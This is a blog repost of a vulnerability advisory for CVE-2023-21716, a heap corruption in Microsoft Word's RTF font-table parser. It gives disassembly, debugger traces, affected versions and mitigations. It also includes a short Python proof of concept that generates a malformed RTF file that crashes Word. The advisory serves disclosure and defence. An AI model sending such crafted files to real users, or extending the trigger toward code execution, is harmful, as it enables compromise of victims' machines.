<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="CVE-2023-21716 Microsoft Word RTF Font Table Heap CorruptionA vulnerability within Microsoft Office’s wwlib allows attackers to achieveremote code execution with the privileges of the victim that open">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption">
<meta property="og:url" content="https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/index.html">
<meta property="og:site_name" content="Bealee&#39;s Blog">
<meta property="og:description" content="CVE-2023-21716 Microsoft Word RTF Font Table Heap CorruptionA vulnerability within Microsoft Office’s wwlib allows attackers to achieveremote code execution with the privileges of the victim that open">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-03-10T09:08:31.224Z">
<meta property="article:modified_time" content="2023-03-12T08:18:31.995Z">
<meta property="article:author" content="Bealee">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="Bealee&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/note/">Note</a></li><!--
     --><!--
       --><li><a href="/tag/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/project/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/03/10/%E9%9F%A9%E5%89%A7%20-%20%E4%BB%A5%E5%90%BE%E4%B9%8B%E5%90%8D/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/03/09/%E8%8B%B1%E8%AF%AD%E8%80%83%E7%A0%94%E5%8D%95%E8%AF%8D%E8%81%94%E6%83%B3%E8%AE%B0%E5%BF%86%E7%AC%94%E8%AE%B0-003/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&text=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&is_video=false&description=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption&body=Check out this article: https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&name=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&t=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Details"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability Details</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Affected-Versions"><span class="toc-number">3.</span> <span class="toc-text">Affected Versions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigations"><span class="toc-number">4.</span> <span class="toc-text">Mitigations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Acknowledgement"><span class="toc-number">5.</span> <span class="toc-text">Acknowledgement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Proof-of-Concept"><span class="toc-number">6.</span> <span class="toc-text">Proof-of-Concept</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Testing-Notes"><span class="toc-number">7.</span> <span class="toc-text">Testing Notes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Appendix"><span class="toc-number">8.</span> <span class="toc-text">Appendix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EOF"><span class="toc-number">9.</span> <span class="toc-text">EOF</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Bealee</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-03-10T09:08:31.224Z" itemprop="datePublished">2023-03-10</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CVEs/">CVEs</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption<br>A vulnerability within Microsoft Office’s wwlib allows attackers to achieve<br>remote code execution with the privileges of the victim that opens a malicious<br>RTF document. The attacker could deliver this file as an email attachment (or<br>other means).</p>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>Microsoft Word is the word processing application included with Microsoft<br>Office. Per a default installation, Microsoft Word handles Rich-Text Format<br>(RTF) documents. Such documents are comprised of primarily 7-bit ASCII based<br>keywords that together can encapsulate a wide variety of rich content.</p>
<h2 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h2><p>The RTF parser in Microsoft Word contains a heap corruption vulnerability when<br>dealing with a font table (<em>\fonttbl</em>) containing an excessive number of fonts<br>(<em>\f###</em>). When processing fonts, the font id value (the numbers after a <em>\f</em>)<br>are handled by the following code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0d6cf0b6 0fbf0e          movsx   ecx,word ptr [esi]         ; load base idx</span><br><span class="line">0d6cf0b9 0fbf5602        movsx   edx,word ptr [esi+2]       ; load font idx</span><br><span class="line">0d6cf0bd 8d1451          lea     edx,[ecx+edx*2]            ; multiply by ~3</span><br><span class="line">0d6cf0c0 668b08          mov     cx,word ptr [eax]          ; load the codepage value</span><br><span class="line">0d6cf0c3 66894c5604      mov     word ptr [esi+edx*2+4],cx  ; write the code page</span><br></pre></td></tr></table></figure>

<p>As shown, the font ID value is loaded by the “movsx” instruction at 0xd6cf0c3.<br>This instruction sign extends the value loaded, thus filling the upper bits of<br><em>edx</em> with <strong>ffff</strong>. The following debugger excerpt illustrates the runtime<br>behavior:</p>
<pre>
*** edx will become: 0x17fc8 (from 0x7fec+0x7fee*2)
*** edx will become: 0x17fc9 (from 0x7fed+0x7fee*2)
*** edx will become: 0x17fde (from 0x7fee+0x7ff8*2)
*** edx will become: 0x17fdf (from 0x7fef+0x7ff8*2)
*** edx will become: 0x17fe0 (from 0x7ff0+0x7ff8*2)
*** edx will become: 0x17fe1 (from 0x7ff1+0x7ff8*2)
*** edx will become: 0x17fe2 (from 0x7ff2+0x7ff8*2)
*** edx will become: 0x17fe3 (from 0x7ff3+0x7ff8*2)
*** edx will become: 0x17fe4 (from 0x7ff4+0x7ff8*2)
*** edx will become: 0x17fe5 (from 0x7ff5+0x7ff8*2)
*** edx will become: 0x17fe6 (from 0x7ff6+0x7ff8*2)
*** edx will become: 0x17fe7 (from 0x7ff7+0x7ff8*2)
*** edx will become: 0xffff7ffc (from 0x7ff8+0xffff8002*2)
</pre>
<p>When this occurs, the memory write instruction at 0xd6cf0c3 corrupts the heap<br>by writing the font code page to a negative offset of the memory held in <em>esi</em>.<br>The following debugger excerpt shows the out-of-bounds memory write.</p>
<pre>
*** writing 0x4e4 to 0xd35ddb4 [0xd32de20+0x17fc8*2+4]
*** writing 0x4e4 to 0xd35ddb6 [0xd32de20+0x17fc9*2+4]
*** writing 0x4e4 to 0xd35dde0 [0xd32de20+0x17fde*2+4]
*** writing 0x4e4 to 0xd35dde2 [0xd32de20+0x17fdf*2+4]
*** writing 0x4e4 to 0xd35dde4 [0xd32de20+0x17fe0*2+4]
*** writing 0x4e4 to 0xd35dde6 [0xd32de20+0x17fe1*2+4]
*** writing 0x4e4 to 0xd35dde8 [0xd32de20+0x17fe2*2+4]
*** writing 0x4e4 to 0xd35ddea [0xd32de20+0x17fe3*2+4]
*** writing 0x4e4 to 0xd35ddec [0xd32de20+0x17fe4*2+4]
*** writing 0x4e4 to 0xd35ddee [0xd32de20+0x17fe5*2+4]
*** writing 0x4e4 to 0xd35ddf0 [0xd32de20+0x17fe6*2+4]
*** writing 0x4e4 to 0xd35ddf2 [0xd32de20+0x17fe7*2+4]
*** writing 0x4e4 to 0xd31de1c [0xd32de20+0xffff7ffc*2+4]
</pre>

<p>Following this memory corruption, additional processing takes place. With a<br>properly crafted heap layout, an attacker cause the heap corruption to yield<br>arbitrary code execution.</p>
<p>Using the proof-of-concept code supplied below, processing eventually reaches<br>the post-processing clean up code. As expected, <em>RtlFreeHeap</em> is called and<br>detects heap corruption as shown below.</p>
<pre>
Critical error detected c0000374
(3ba8.21f4): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ntdll_77a40000!RtlReportCriticalFailure+0x4b:
77b27012 cc              int     3
0:000:x86> kv
 # ChildEBP RetAddr  Args to Child              
00 008f3834 77b30114 00000001 77b63990 77b2e009 ntdll_77a40000!RtlReportCriticalFailure+0x4b (FPO: [Non-Fpo])
01 008f3840 77b2e009 70dcf286 00000000 1ff78c20 ntdll_77a40000!RtlpReportHeapFailure+0x2f (FPO: [0,0,4])
02 008f3870 77b36480 00000003 00a50000 1ff78c20 ntdll_77a40000!RtlpHpHeapHandleError+0x89 (FPO: [Non-Fpo])
03 008f3888 77b2dd17 1ff78c20 0000000a 00000000 ntdll_77a40000!RtlpLogHeapFailure+0x43 (FPO: [Non-Fpo])
04 008f38ec 77a83f8d 00a50258 70dcf0be 1ff78c20 ntdll_77a40000!RtlpAnalyzeHeapFailure+0x281 (FPO: [Non-Fpo])
05 008f3a48 77ac7b9d 1ff78c20 1ff78c28 1ff78c28 ntdll_77a40000!RtlpFreeHeap+0x24d (FPO: [Non-Fpo])
06 008f3aa4 77a83ce6 00000000 00000000 00000000 ntdll_77a40000!RtlpFreeHeapInternal+0x783 (FPO: [Non-Fpo])
07 008f3ac4 05343c06 00a50000 00000000 1ff78c28 ntdll_77a40000!RtlFreeHeap+0x46 (FPO: [Non-Fpo])
08 008f3adc 06e6e330 1ff78c28 06c8dc6d 08a11040 mso20win32client!Mso::Memory::Free+0x47 (FPO: [Non-Fpo])
09 008f3b0c 0430b5af 08a1104c 08a11040 08a11044 mso!MsoFreePpv+0x84 (FPO: [Non-Fpo])
0a 008f3b28 0430bed0 008f9f0c 008f586c ffffffff wwlib!FreeHribl+0x8c (FPO: [Non-Fpo])
0b 008f3b70 033be323 40280000 00200002 1a772b98 wwlib!PdodCreateRtf+0x243 (FPO: [6,13,4])
0c 008f52bc 02e465db 04012000 20280000 00200002 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x1e0966
0d 008f5600 03031155 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x321 (FPO: [Non-Fpo])
0e 008f5680 0301583a 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4])
0f 008f8c4c 030175d4 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0xf3b (FPO: [Non-Fpo])
10 008f8d14 03c43d9b 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0])
11 008f9e40 03c43a92 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2f6 (FPO: [Non-Fpo])
12 008f9e7c 0343bd43 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0])
13 008fb31c 02d17666 00000001 00000000 02d17609 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x271a8e
14 008fb554 02c594f5 71fc93df 7625f550 0000000a wwlib!Boot::IfrParseCommandLine2+0x5d (FPO: [Non-Fpo])
15 008fb5c8 02c59317 008fb5f8 02c50000 02c58ff4 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo])
16 008ff684 02c59058 96c6d88c 000800e4 71fcd0a7 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo])
17 008ff6b8 00dd1917 00dd0000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo])
18 008ff908 00dd114a 00dd0000 00000000 00a54944 winword!WinMain+0x146 (FPO: [Non-Fpo])
19 008ff954 7625fa29 0069a000 7625fa10 008ff9c0 winword!std::_Deallocate<8,0>+0x1e3 (FPO: [Non-Fpo])
1a 008ff964 77aa7bbe 0069a000 70dc3336 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])
1b 008ff9c0 77aa7b8e ffffffff 77ac8d0f 00000000 ntdll_77a40000!__RtlUserThreadStart+0x2f (FPO: [SEH])
1c 008ff9d0 00000000 00dd1000 0069a000 00000000 ntdll_77a40000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
</pre>

<p>Analysts can also use Page Heap to verify that the code attempts to write out<br>of bounds. Doing so results in the following:</p>
<pre>
(afe8.9a5c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
wwlib!FSearchFtcmap+0x150:
0dc1f0c3 66894c5604      mov     word ptr [esi+edx*2+4],cx ds:002b:1ebf2fec=????
0:000:x86> kv
 # ChildEBP RetAddr  Args to Child              
00 0135135c 0dc0fa17 013513ec 00000001 013513d8 wwlib!FSearchFtcmap+0x150 (FPO: [Non-Fpo])
01 01353828 0dc0ddb5 ddc5a2cb 0b3d3028 000ad400 wwlib!RtfInRare+0x1845 (FPO: [Non-Fpo])
02 01353c5c 0ef5c473 00000200 0b3d3028 66565a58 wwlib!CchRtfInCore+0x28df (FPO: [Non-Fpo])
03 01353eac 0ef5be04 0b3d302c 0135a294 01355bf4 wwlib!RtfGetChars+0x183 (FPO: [Non-Fpo])
04 01353ef8 0e00e323 40280000 00200002 45646f10 wwlib!PdodCreateRtf+0x177 (FPO: [6,13,4])
05 01355644 0da965db 04012000 20280000 00200002 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x1e0966
06 01355988 0dc81155 00000000 ffffffff 00000000 wwlib!PdodCreatePfnCore+0x321 (FPO: [Non-Fpo])
07 01355a08 0dc6583a 00000000 ffffffff 00000000 wwlib!PdodCreatePfnBPPaapWithEdpi+0x75 (FPO: [18,3,4])
08 01358fd4 0dc675d4 04012000 00000000 00000002 wwlib!PdodOpenFnmCore2+0xf3b (FPO: [Non-Fpo])
09 0135909c 0e893d9b 04012000 00000000 00000002 wwlib!PdodOpenFnmCore+0xb9 (FPO: [15,30,0])
0a 0135a1c8 0e893a92 00000000 00000000 00000002 wwlib!FFileOpenXszCore+0x2f6 (FPO: [Non-Fpo])
0b 0135a204 0e08bd43 00000000 00000000 00000002 wwlib!FFileOpenXstzCore+0x3d (FPO: [6,4,0])
0c 0135b6a4 0d967666 00000001 00000000 0d967609 wwlib!``Osf::SimpleFlight::Details::SetupFlight_String'::`3'::<lambda_1>::operator()'::`2'::`dynamic atexit destructor for 'scopes''+0x271a8e
0d 0135b8dc 0d8a94f5 ddc527df 7625f550 0000000a wwlib!Boot::IfrParseCommandLine2+0x5d (FPO: [Non-Fpo])
0e 0135b954 0d8a9317 0135b984 0d8a0000 0d8a8ff4 wwlib!Boot::FRun+0xb4 (FPO: [Non-Fpo])
0f 0135fa10 0d8a9058 cbd5c9e4 00080138 ddc564d3 wwlib!FWordBoot+0x5a (FPO: [Non-Fpo])
10 0135fa44 00dd1917 00dd0000 00000000 0000000a wwlib!FMain+0x64 (FPO: [Non-Fpo])
11 0135fc94 00dd114a 00dd0000 00000000 05e18ff4 winword!WinMain+0x146 (FPO: [Non-Fpo])
12 0135fce0 7625fa29 011cf000 7625fa10 0135fd4c winword!std::_Deallocate<8,0>+0x1e3 (FPO: [Non-Fpo])
13 0135fcf0 77aa7bbe 011cf000 96082e8a 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])
14 0135fd4c 77aa7b8e ffffffff 77ac8d34 00000000 ntdll_77a40000!__RtlUserThreadStart+0x2f (FPO: [SEH])
15 0135fd5c 00000000 00dd1000 011cf000 00000000 ntdll_77a40000!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
</pre>


<h2 id="Affected-Versions"><a href="#Affected-Versions" class="headerlink" title="Affected Versions"></a>Affected Versions</h2><p>This vulnerability affects at least the following versions of Microsoft Office:</p>
<ul>
<li>Microsoft Office 365 (Insider Preview - 2211 Build 15831.20122 CTR)</li>
<li>Microsoft Office 2016 (Including Insider Slow - 1704 Build 8067.2032 CTR)</li>
<li>Microsoft Office 2013</li>
<li>Microsoft Office 2010</li>
<li>Microsoft Office 2007<br>Older versions may also be affected but were not tested. Furthermore, the<br>technical details of this vulnerability have evolved over the years.</li>
</ul>
<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Microsoft Office 2010 and later use Protected View to limit damage caused by<br>malicious documents procured from untrusted sources. Protected View is<br>in effect when this vulnerability manifests and thus an additional sandbox<br>escape vulnerability would be required to gain full privileges.</p>
<p>Removing the file association for the RTF extension is ineffective because<br>using a DOC extension will still reach the vulnerable code.</p>
<h2 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h2><p>This issue was discovered, analyzed, and reported by Joshua J. Drake (@jduck).</p>
<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof-of-Concept"></a>Proof-of-Concept</h2><p>The following Python script will generate a file that will trigger this issue:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PoC for:</span></span><br><span class="line"><span class="comment"># Microsoft Word RTF Font Table Heap Corruption Vulnerability</span></span><br><span class="line"><span class="comment"># by Joshua J. Drake (@jduck)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># allow overriding the number of fonts</span></span><br><span class="line">num = <span class="number">32761</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">num = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;tezt.rtf&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;&#123;\\rtf1&#123;\n&#123;\\fonttbl&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">f.write(<span class="string">b&quot;&#123;\\f%dA;&#125;\n&quot;</span> % i)</span><br><span class="line">f.write(<span class="string">b&quot;&#125;\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;&#123;\\rtlch it didn&#x27;t crash?? no calc?! BOO!!!&#125;\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">b&quot;&#125;&#125;\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h2 id="Testing-Notes"><a href="#Testing-Notes" class="headerlink" title="Testing Notes"></a>Testing Notes</h2><p>Running Microsoft Word repeatedly with this malformed input will trigger “Safe<br>Mode” as well as a file-specific block list. To observe the behavior that a<br>victim user would see, the tester should flush the “Safe Mode” flag and<br>file-specific block list before re-testing. Otherwise, simply declining “Safe<br>Mode” and clicking “Open Anyway” is sufficient for re-tests.</p>
<p>Using heavy breakpoints (such as those supplied below) in WinDbg and enabling<br>Page Heap can slow the startup process significantly. The researcher observed<br>situations during testing where the vulnerable code was not reached. Minimal<br>effort was invested to determine the cause, but it appears to be related to a<br>combination of Page Heap, heavy breakpoints, and a “What’s new” dialog popup.</p>
<h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><p>The following script was used within WinDbg to generate the above output. All<br>excerpts were obtained using Office 365 Insider Preview 2211 Build 15831.20122<br>CTR.</p>
<pre>
* clear all breakpoints
bc *
* hide the debugger
e ebx+2 00
* run until wwlib is loaded
xe ld:wwlib
g; wait
* make the breakpoints
* watch index calculations
bp wwlib+0x37f0bd ".printf \"*** edx will become: 0x%x (from 0x%x+0x%x*2)\\n\", (ecx+edx*2), ecx, edx;gc"
* watch the writes
bp wwlib+0x37f0c3 ".printf \"*** writing 0x%x to 0x%x [0x%x+0x%x*2+4] (div 3: 0x%x)\\n\", ecx & 0xffff, (esi+(edx*2)+4), esi, edx, edx/3;gc"
g
</pre>
<h2 id="EOF"><a href="#EOF" class="headerlink" title="EOF"></a>EOF</h2>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/note/">Note</a></li>
         
          <li><a href="/tag/">Tag</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/project/">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability-Details"><span class="toc-number">2.</span> <span class="toc-text">Vulnerability Details</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Affected-Versions"><span class="toc-number">3.</span> <span class="toc-text">Affected Versions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigations"><span class="toc-number">4.</span> <span class="toc-text">Mitigations</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Acknowledgement"><span class="toc-number">5.</span> <span class="toc-text">Acknowledgement</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Proof-of-Concept"><span class="toc-number">6.</span> <span class="toc-text">Proof-of-Concept</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Testing-Notes"><span class="toc-number">7.</span> <span class="toc-text">Testing Notes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Appendix"><span class="toc-number">8.</span> <span class="toc-text">Appendix</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EOF"><span class="toc-number">9.</span> <span class="toc-text">EOF</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&text=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://bealee008.github.io/2023/03/10/%E5%BE%AE%E8%BD%AFWord%20RCE(CVE-2023-21716)%20Poc/&title=CVE-2023-21716 Microsoft Word RTF Font Table Heap Corruption"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
